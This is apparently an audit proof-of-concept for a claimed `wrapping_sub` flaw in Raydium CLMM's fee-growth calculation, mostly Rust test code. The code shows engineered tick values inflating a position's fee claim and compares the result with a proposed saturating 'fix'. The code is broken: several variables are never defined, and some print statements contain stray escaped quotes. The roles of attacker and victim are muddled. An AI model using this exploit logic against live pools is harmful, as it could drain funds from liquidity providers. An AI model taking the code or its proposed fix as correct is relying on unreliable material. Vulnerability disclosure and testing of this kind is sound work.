## Detailed Rust Integration Test POC Structure for `wrapping_sub` Vulnerability (AMM-MATH-CRIT-001)

This document outlines the structure for a Rust-based integration test to demonstrate the `wrapping_sub` vulnerability in the Raydium CLMM's `get_fee_growth_inside` function. This test should be implemented using a framework like `anchor-lang`'s testing tools or `solana-program-test` to interact with the compiled CLMM program.

**Objective:** To show that by manipulating `fee_growth_outside_X` values of a position's boundary ticks (`O_L`, `O_U`) and then moving the current price out of range, `get_fee_growth_inside` can produce an artifactually massive wrapped value (`W_FIG`). This `W_FIG` then corrupts `ProtocolPositionState.fee_growth_inside_X_last_x64`, leading to an attacker's `PersonalPositionState` calculating a massively inflated fee/reward delta upon its next update.

---

**I. Test Setup Function (Conceptual)**

*   **Purpose:** Initialize the Solana test validator, deploy the CLMM program, and set up necessary initial accounts and mints. This part is highly dependent on your specific testing framework (`anchor test` or `solana-program-test`).
*   **Key elements to create/mock:**
    *   `PoolState` instance (minimal, with relevant `tick_current`, `fee_growth_global_0_x64`, `fee_growth_global_1_x64`).
    *   `TickState` instances for `tick_lower` and `tick_upper` with specific `fee_growth_outside_X_x64` values.
    *   `ProtocolPositionState` instance to see its `fee_growth_inside_X_last_x64` being updated.
    *   `PersonalPositionState` instance to simulate a user's claim.
    *   `RewardInfo` array (can be default/empty if focusing only on fees for this POC).

---

**II. Main POC Test Function (`#[test] fn test_fee_growth_wrapping_exploit_out_of_range()`)**

This test will directly call the public functions from your codebase to demonstrate the arithmetic.

```rust
#[cfg(test)]
mod poc_tests {
    // Adjust these use statements based on your actual project structure
    use crate::states::pool::{PoolState, RewardInfo, REWARD_NUM}; // Assuming REWARD_NUM is defined in pool.rs
    use crate::states::tick_array::{TickState, get_fee_growth_inside};
    use crate::states::protocol_position::ProtocolPositionState;
    use crate::states::personal_position::PersonalPositionState;
    use crate::instructions::increase_liquidity::calculate_latest_token_fees;
    use crate::libraries::fixed_point_64::Q64;
    use crate::libraries::big_num::U128; // For MulDiv and to_underflow_u64
    use crate::libraries::full_math::MulDiv;

    // Helper to simulate the to_underflow_u64 for U128 as it's a trait method
    // In a real test, you'd call it on a U128 instance.
    fn to_underflow_u64_simulation(value: u128) -> u64 {
        if value > u64::MAX as u128 {
            0
        } else {
            value as u64
        }
    }

    // Helper to simulate the corrected get_fee_growth_inside for out-of-range
    fn get_fee_growth_inside_fixed_out_of_range(
        tick_lower: &TickState,
        tick_upper: &TickState,
        tick_current: i32,
        // For out-of-range, global isn't directly in O_L - O_U, but needed for full signature
        _fee_growth_global_0_x64: u128,
        _fee_growth_global_1_x64: u128
    ) -> (u128, u128) {
        let fig0;
        if tick_current < tick_lower.tick {
            fig0 = tick_lower.fee_growth_outside_0_x64.saturating_sub(tick_upper.fee_growth_outside_0_x64);
        } else if tick_current >= tick_upper.tick {
            fig0 = tick_upper.fee_growth_outside_0_x64.saturating_sub(tick_lower.fee_growth_outside_0_x64);
        } else {
            // In-range case, not the focus of this specific POC path, assume normal calculation
            // or use the full saturating_sub logic:
            // G.saturating_sub(O_L).saturating_sub(O_U)
            // For simplicity, if G, O_L, O_U are such that it's 0 for the initial state:
            fig0 = 0;
        }
        (fig0, 0) // Assuming we only care about token0 fees for this POC
    }


    #[test]
    fn poc_wrapping_sub_out_of_range_inflation() {
        println!("\n--- Rust Unit Test: `wrapping_sub` Exploit (Out-of-Range Scenario) ---");

        // --- Phase 1: Setup Engineered TickState values ---
        // These values represent fee_growth_outside_0_x64 (Q64.64 format)
        // Scenario: Price is below T_L. We need O_U > O_L for O_L.wrapping_sub(O_U) to wrap.
        let o_l_val: u128 = 100 * Q64; // tick_lower.fee_growth_outside_0_x64
        let o_u_val: u128 = 500 * Q64; // tick_upper.fee_growth_outside_0_x64 (O_U > O_L)

        let tick_lower_state = TickState {
            tick: -100, // T_L
            fee_growth_outside_0_x64: o_l_val,
            // Initialize other fields to valid defaults or specific test values if they affect logic
            fee_growth_outside_1_x64: 0,
            liquidity_net: 0,
            liquidity_gross: 1, // Must be non-zero to be considered initialized
            reward_growths_outside_x64: [0; REWARD_NUM],
            padding: [0; 13], // Ensure this matches your struct definition
        };

        let tick_upper_state = TickState {
            tick: 100,  // T_U
            fee_growth_outside_0_x64: o_u_val,
            fee_growth_outside_1_x64: 0,
            liquidity_net: 0,
            liquidity_gross: 1, // Initialized
            reward_growths_outside_x64: [0; REWARD_NUM],
            padding: [0; 13],
        };

        // This G_current is passed to get_fee_growth_inside.
        // For the O_L.wrapping_sub(O_U) path, G is used to derive fee_growth_below/above first.
        // G must be >= O_L and G >= O_U for those intermediate checked_subs to be safe.
        let current_pool_fee_growth_global_0_x64 = o_u_val.max(o_l_val) + (10 * Q64); // Ensure G is larger than both O_L and O_U

        println!("\n--- Initial States ---");
        println!("T_L.tick: {}, T_L.FGO0 (O_L): {}", tick_lower_state.tick, o_l_val);
        println!("T_U.tick: {}, T_U.FGO0 (O_U): {}", tick_upper_state.tick, o_u_val);
        println!("Pool.fee_growth_global_0_x64 (G): {}", current_pool_fee_growth_global_0_x64);

        // --- Phase 2: Attacker Opens Position (P_victim has a normal snapshot) ---
        // Assume a victim PersonalPositionState (P_victim) already exists or is created
        // when ProtocolPositionState was normal.
        // P_victim.fee_growth_inside_0_last_x64 (P_FIG_normal)
        let p_victim_fig_initial_snapshot: u128 = 10 * Q64; // A small, normal, non-wrapped prior snapshot
        let p_victim_liquidity: u128 = 1_000_000; // Victim's liquidity

        println!("\nVictim P_victim's initial state:");
        println!("  P_victim.fee_growth_inside_0_last_x64 (P_FIG_normal): {}", p_victim_fig_initial_snapshot);
        println!("  P_victim.liquidity: {}", p_victim_liquidity);

        // --- Phase 3: Price Moves Out of Range ---
        let tick_current_exploiting = -200; // Price is now < T_L (-100)
        println!("\nPrice moves out of range: tick_current = {}", tick_current_exploiting);
        assert!(tick_current_exploiting < tick_lower_state.tick);

        // --- Phase 4: ProtocolPositionState Update (Corruption) ---
        // This happens when any liquidity event occurs in the [T_L, T_U] range.
        // get_fee_growth_inside is called with current_tick_exploiting.
        // Since tick_current < T_L, and O_U > O_L:
        // FIG_calc = O_L.wrapping_sub(O_U)
        let (w_fig_0, _w_fig_1) = get_fee_growth_inside(
            &tick_lower_state,
            &tick_upper_state,
            tick_current_exploiting,
            current_pool_fee_growth_global_0_x64,
            0, // fee_growth_global_1_x64
        );

        let expected_w_fig = o_l_val.wrapping_sub(o_u_val);
        println!("\n`get_fee_growth_inside` called for ProtocolPositionState update:");
        println!("  Calculated W_FIG (raw FIG for range): {}", w_fig_0);
        println!("  Expected W_FIG (O_L.wrapping_sub(O_U)): {}", expected_w_fig);
        assert_eq!(w_fig_0, expected_w_fig, "W_FIG calculation mismatch!");
        // Check it's a large wrapped value. (U128_MOD - (O_U - O_L))
        let expected_wrapped_value = (0u128.wrapping_sub(o_u_val.saturating_sub(o_l_val)));
        assert_eq!(w_fig_0, expected_wrapped_value, "W_FIG is not the expected wrapped value.");


        // This W_FIG now updates the ProtocolPositionState for the range [T_L, T_U].
        // For the POC, we'll use this W_FIG directly as the `fee_growth_inside_latest_x64`
        // that `calculate_latest_token_fees` would read from the (now corrupted) ProtocolPositionState.
        let current_protocol_fig_for_range = w_fig_0;
        println!("  ProtocolPositionState.fee_growth_inside_0_last_x64 is now W_FIG: {}", current_protocol_fig_for_range);

        // --- Phase 5: Victim User Y Claims Fees ---
        // calculate_latest_token_fees is called for P_victim.
        // It uses:
        //   fee_growth_inside_latest_x64 = current_protocol_fig_for_range (which is W_FIG)
        //   fee_growth_inside_last_x64 = p_victim_fig_initial_snapshot (normal, small value)
        //   liquidity = p_victim_liquidity

        let tokens_owed_victim_u64 = calculate_latest_token_fees(
            0, // last_total_fees for victim (base value, not affecting the delta logic here)
            p_victim_fig_initial_snapshot,
            current_protocol_fig_for_range, // W_FIG
            p_victim_liquidity
        );

        // For detailed verification of intermediate steps in calculate_latest_token_fees:
        let delta_for_victim_raw_fig = current_protocol_fig_for_range.wrapping_sub(p_victim_fig_initial_snapshot);
        let tokens_owed_scaled_u128_victim = U128(delta_for_victim_raw_fig)
            .mul_div_floor(U128(p_victim_liquidity), U128(Q64))
            .unwrap().0;
        let actual_claimable_u64_victim = U128(tokens_owed_scaled_u128_victim).to_underflow_u64();

        println!("\nVictim User Y attempts to claim fees:");
        println!("  Victim's P_FIG_initial_snapshot:                                    {}", p_victim_fig_initial_snapshot);
        println!("  ProtocolPositionState FIG used for claim (W_FIG):                   {}", current_protocol_fig_for_range);
        println!("  Delta for victim (W_FIG.wrapping_sub(P_FIG_initial)) (raw FIG units): {}", delta_for_victim_raw_fig);
        println!("  Tokens Owed to Victim (scaled U128, raw token0 units):              {}", tokens_owed_scaled_u128_victim);
        println!("  Final Claimable Fees by Victim (u64 after to_underflow_u64):        {}", tokens_owed_victim_u64);

        assert_eq!(tokens_owed_victim_u64, actual_claimable_u64_victim, "Mismatch in final u64 calculation");

        // Assertions for exploit:
        // 1. The raw delta for the victim should be massive.
        assert!(delta_for_victim_raw_for_victim > (1u128 << 127), "Exploitable delta is not massive!");

        // 2. The final claimable amount should be significantly larger than any legitimate fees.
        // Legitimate fees for this period (price out of range for P_Y) should be 0 new accrual.
        // The claim should be for (W_FIG - P_FIG_initial_normal) * L_victim / Q64.
        // Example: O_L=100*Q64, O_U=500*Q64 => W_FIG = U128_MOD - 400*Q64
        // P_FIG_initial_normal = 10*Q64
        // Delta = U128_MOD - 400*Q64 - 10*Q64 = U128_MOD - 410*Q64
        // Tokens owed (scaled) = (U128_MOD - 410*Q64) * L_victim / Q64
        //                     = ( (2^128/Q64) - 410 ) * L_victim
        //                     = (2^64 - 410) * L_victim
        let expected_tokens_owed_if_no_u64_overflow = ( (1u128 << 64) - 410 ) * victim_liquidity;

        println!("  Expected inflated tokens_owed_scaled_u128 (approx): {}", expected_tokens_owed_if_no_u64_overflow);
        assert_eq!(tokens_owed_scaled_u128_victim, expected_tokens_owed_if_no_u64_overflow, "Scaled token owed calculation does not match expected inflation");

        if calculated_claimable_victim_u64_from_poc > 0 {
            println!("  SUCCESS: Vulnerability demonstrated. Victim Y could claim an inflated {} token0 units.", calculated_claimable_victim_u64_from_poc);
            // Check if it's less than u64::MAX but significantly positive
            assert!(calculated_claimable_victim_u64_from_poc < u64::MAX, "Claim overflowed u64 MAX, to_underflow_u64 would make it 0");
            assert!(calculated_claimable_victim_u64_from_poc > victim_liquidity, "Claimed fees not significantly inflated"); // Simple heuristic
        } else {
            println!("  NOTE: Inflated claim was zeroed out by to_underflow_u64. Intermediate scaled U128 value was: {}. This still indicates a flaw in FIG calculation if intermediate was huge.", tokens_owed_scaled_u128_victim);
            assert!(tokens_owed_scaled_u128_victim > u64::MAX as u128, "If zeroed by to_underflow_u64, intermediate should be > u64::MAX");
        }

        // --- Comparison with Fixed get_fee_growth_inside ---
        let fixed_w_fig_0 = get_fee_growth_inside_fixed_poc_equivalent(
            &tick_lower_state,
            &tick_upper_state,
            tick_current_exploiting,
            current_fee_growth_global_0_x64
        );
        println!("\n--- Comparison with Fixed Logic for get_fee_growth_inside ---");
        println!("  Fixed FIG_calc (O_L.saturating_sub(O_U)): {}", fixed_w_fig_0);
        assert_eq!(fixed_w_fig_0, 0, "Fixed FIG for out-of-range should be 0");

        // If ProtocolPositionState was updated with this fixed_fig_calc (0)
        // AND if calculate_latest_token_fees also used saturating_sub for its delta:
        let fixed_fee_growth_delta_user = fixed_w_fig_0.saturating_sub(victim_personal_fig_initial_snapshot);
        let fixed_tokens_owed_scaled_user = U128(fixed_fee_growth_delta_user)
            .mul_div_floor(U128(victim_liquidity), U128(Q64))
            .unwrap().0;
        let fixed_claimable_u64_user = U128(fixed_tokens_owed_scaled_user).to_underflow_u64();

        println!(\"  Delta for victim with fixed FIG_calc AND fixed delta calc (saturating_sub for delta): {}\", fixed_fee_growth_delta_user);
        println!(\"  Tokens Owed to Victim with full fix (u64): {}\", fixed_claimable_u64_user);
        // If P_FIG_initial was >0, and fixed_w_fig_0 is 0, then fixed_user_delta is 0.
        // The user would only claim fees that accrued *before* P_FIG_initial_snapshot was taken,
        // which are already in their `token_fees_owed_0` before this `calculate_latest_token_fees` call.
        // So, the *additional* fees for *this period* should be 0.
        assert_eq!(fixed_claimable_u64_user, 0, "Fees with full fix (for this period's accrual) should be 0");
    }

    // Helper for the fixed get_fee_growth_inside logic for this POC's out-of-range case
    // This is a simplified version for the POC. The actual fix would be in the main function.
    fn get_fee_growth_inside_fixed_poc_equivalent(
        tick_lower: &TickState,
        tick_upper: &TickState,
        tick_current: i32,
        fee_growth_global_0_x64: u128 // G
    ) -> u128 {
        if tick_current < tick_lower.tick {
            // Price is below the lower tick of the position
            return tick_lower.fee_growth_outside_0_x64.saturating_sub(tick_upper.fee_growth_outside_0_x64);
        } else if tick_current >= tick_upper.tick {
            // Price is above or at the upper tick of the position
            return tick_upper.fee_growth_outside_0_x64.saturating_sub(tick_lower.fee_growth_outside_0_x64);
        } else {
            // Price is within the range [tickLower, tickUpper)
            // Corrected in-range calculation:
            let fee_growth_below_0_x64 = tick_lower.fee_growth_outside_0_x64;
            let fee_growth_above_0_x64 = tick_upper.fee_growth_outside_0_x64;
            return fee_growth_global_0_x64
                .saturating_sub(fee_growth_below_0_x64)
                .saturating_sub(fee_growth_above_0_x64);
        }
    }
}
```
